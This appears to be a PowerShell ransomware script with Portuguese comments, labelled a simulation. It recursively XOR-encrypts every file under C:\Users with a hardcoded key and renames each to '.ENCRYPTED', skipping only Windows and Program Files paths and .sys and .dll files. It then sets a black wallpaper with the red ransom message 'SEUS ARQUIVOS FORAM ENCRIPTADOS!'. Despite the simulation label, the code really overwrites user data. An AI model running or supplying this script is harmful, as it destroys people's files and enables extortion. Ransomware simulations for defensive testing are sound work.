$Key = [System.Text.Encoding]::UTF8.GetBytes("mO2MeuEd")
$TargetRoot = "C:\Users"   # Para simular toda a máquina, pode ser "C:\", mas EVITE em produção real/testes em ambiente crítico.

function Encrypt-FileXOR {
    param($FilePath, $Key)
    # Não encriptar arquivos críticos do sistema operacional Windows! (Adapte, se necessário)
    if ($FilePath -notmatch "\\Windows\\" -and $FilePath -notmatch "\\Program Files") {
        $data = [System.IO.File]::ReadAllBytes($FilePath)
        for ($i=0; $i -lt $data.Length; $i++) {
            $data[$i] = $data[$i] -bxor $Key[$i % $Key.Length]
        }
        [System.IO.File]::WriteAllBytes($FilePath, $data)
        Rename-Item $FilePath "$FilePath.ENCRYPTED"
    }
}

Get-ChildItem -Path $TargetRoot -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { ($_.Extension -ne ".sys") -and ($_.Extension -ne ".dll") } |
    ForEach-Object {
        try {
            Encrypt-FileXOR $_.FullName $Key
        } catch {}
    }

# Mensagem visual de resgate (wallpaper)
$bmpPath = "$env:TEMP\resgate.bmp"
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap 1024,768
$Graphics = [System.Drawing.Graphics]::FromImage($bmp)
$Brush = [System.Drawing.Brushes]::Black
$Graphics.FillRectangle($Brush, 0,0,1024,768)
$Font = New-Object System.Drawing.Font "Arial", 36
$BrushRed = [System.Drawing.Brushes]::Red
$Graphics.DrawString("SEUS ARQUIVOS FORAM ENCRIPTADOS!", $Font, $BrushRed, 90,340)
$bmp.Save($bmpPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
$bmp.Dispose()
$Graphics.Dispose()

function Set-Wallpaper($bmpPath) {
    Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $bmpPath, 3)
}
Set-Wallpaper -bmpPath $bmpPath

Write-Host "Simulação concluída: máquina 'encriptada'."
